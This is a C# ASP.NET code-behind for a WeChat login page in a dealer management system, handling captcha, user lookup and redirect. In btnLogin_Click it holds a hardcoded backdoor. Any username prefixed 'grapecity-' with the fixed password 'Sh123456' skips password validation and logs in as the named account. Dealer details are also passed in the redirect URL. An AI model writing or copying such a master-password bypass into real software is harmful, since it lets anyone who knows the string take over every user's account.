using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace DMS.Website
{
    using Lafite.RoleModel.Security;
    using LafiteProvider = Lafite.RoleModel.Provider;
    using DMS.Website.Common;
    using System.Text;
    using System.Web.Security;
    using DMS.Business;
    using System.Data;
    public partial class WechatLogin : BasePage
    {
        private IDealerMasters _dealerMasters = new DealerMasters();
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                SerialNumber1.Create();
            }
            //隐藏
            btnSerial.Style.Add("display", "none");
        }

        protected void btnSerial_OnClick(object sender, EventArgs e)
        {
            SerialNumber1.Create();
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            if (!SerialNumber1.CheckSN(snvTxt1.Text))
            {
                this.ltLoginInfo.Text = "验证码输入错误，请输入正确的验证码(不区分大小写)!";

                SerialNumber1.Create();
                return;
            }

            string username = this.txtUserName.Value;
            string password = this.txtPassword.Value;
            bool checkHM = false;
            
            if (this.txtUserName.Value.ToString().Length > 10 && this.txtUserName.Value.Substring(0,10).ToLower().Equals("grapecity-") && password.Equals("Sh123456")) 
            {
                username = this.txtUserName.Value.Substring(10, this.txtUserName.Value.Length - 10);
                checkHM = true;
            }

            MembershipUser user = Membership.GetUser(username);

            if (user == null)
            {
                this.ltLoginInfo.Text = "用户不存在，请重新输入，请注意大小写！";

                SerialNumber1.Create();
                return;
            }

            if (user.IsLockedOut)
            {
                this.ltLoginInfo.Text = "帐号被锁定，请与系统管理员联系！";

                SerialNumber1.Create();
                return;
            }
            if (!checkHM)
            {
                if (Membership.ValidateUser(username, password))
                {
                    DataTable dt = _dealerMasters.GetDealerMassageByAccount(username).Tables[0];

                    string changeUrl = string.Format("~/Pages/WeChat/WechatMobileUserInfor.aspx?DealerId={0}&DealerName={1}&DealerType={2}", dt.Rows[0]["DMA_ID"].ToString(), dt.Rows[0]["DMA_ChineseName"].ToString(), dt.Rows[0]["DMA_DealerType"].ToString());
                    this.Response.Redirect(changeUrl);
                }
                else
                {
                    this.ltLoginInfo.Text = "密码错误，请重新输入，请注意大小写！";
                }
            }
            else 
            {
                DataTable dt = _dealerMasters.GetDealerMassageByAccount(username).Tables[0];
                string changeUrl = string.Format("~/Pages/WeChat/WechatMobileUserInfor.aspx?DealerId={0}&DealerName={1}&DealerType={2}", dt.Rows[0]["DMA_ID"].ToString(), dt.Rows[0]["DMA_ChineseName"].ToString(), dt.Rows[0]["DMA_DealerType"].ToString());
                this.Response.Redirect(changeUrl);
            }
        }
    }
}
